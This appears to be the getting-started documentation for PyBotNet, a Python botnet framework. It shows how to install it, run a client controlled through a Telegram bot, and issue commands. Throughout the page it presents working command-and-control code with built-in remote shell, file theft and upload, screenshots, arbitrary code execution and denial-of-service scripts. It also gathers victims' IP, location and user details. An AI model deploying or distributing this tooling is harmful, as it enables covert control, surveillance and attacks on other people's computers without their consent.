
### Install PyBotNet

```console
pip3 install pybotnet -U --pre
```

!!! note
    Currently version 2 of the PyBotNet is pre-release

    `--pre`: 
        Include pre-release and development versions. By default, pip only finds stable versions.

    `-U`: make sure to upgrade framework to latest version.

---

#### The simplest PyBotNet file could look like this:


```py title="main.py"

from pybotnet import BotNet, TelegramEngine


telegram_engine = TelegramEngine(token=TELEGRAM_TOKEN, admin_chat_id=ADMIN_CHAT_ID) #(1)

botnet = BotNet(telegram_engine) # (2)
botnet.run()
```

1. create engine: Engines transfer messages between admin and botnet
2. create BotNet instance


!!! note
    * `TELEGRAM_TOKEN`: Get it from the telegram @botfather
    * `ADMIN_CHAT_ID`: Get it from @userinfobot
    * this code include default scripts, like: `shell`, `put_file`, `get_file`, `screenshot`, `who`, ...


#### Run code:

```console 

python3 main.py
```

#### telegram engine

open telegram and send `/who` to your bot; If you have done the steps correctly, you recive message like this:

```
scripts_name:
    echo
    who
    shell
    screenshot
    put_file
    get_file
    runcode
    openurl
    dos
    schedule

mac_addres: 228362405364
os: Linux
global_ip: 5.10.30.35
country: Iran, Islamic Republic of
bot_name: no_name
local_ip: {'192.168.23.160'}
host_name: {'system_name'}
system_user: root
up_time: 0:00:01
current_route: /
pid: 148352
cpu_count: 8
pybotnet_version: 2.0.8b0
from cache: True
```


you can send `/help` to see help page, or send `/help <script_name>` to recive more help about script.

for example send `/help screenshot`, You will receive:

```
NAME:
screenshot

DESCRIPTION:
get screen shot
    * `[mac-address] /screenshot`
    or
    * `/screenshot`

    example command: 
        * `94945035671481 /screenshot`
        * `/screenshot` 

    return: img or img-download-link
    

script_version: 0.0.1
default_script: True

___________________________
scripts_name: ['echo', 'who', 'shell', 'screenshot', 'put_file', 'get_file', 'runcode', 'openurl', 'dos', 'schedule']
mac_addres: 228362405364
os: Linux
global_ip: 5.160.39.34
country: Iran, Islamic Republic of
bot_name: no_name
use_proxy: False
```

in top of message you see script name, description, syntax and examples.

for run screenshot script you have two choice:

* Run the script on all clients that are listening to Telegram bot (for now we have one!)
* Run script on one system

for run script on all client send `/screenshot` bot if you need get screen shot on specific system you need send `[mac_addres] /screenshot` for our case: `228362405364 /screenshot`

in some case like `/shell` you need to run it just for one system
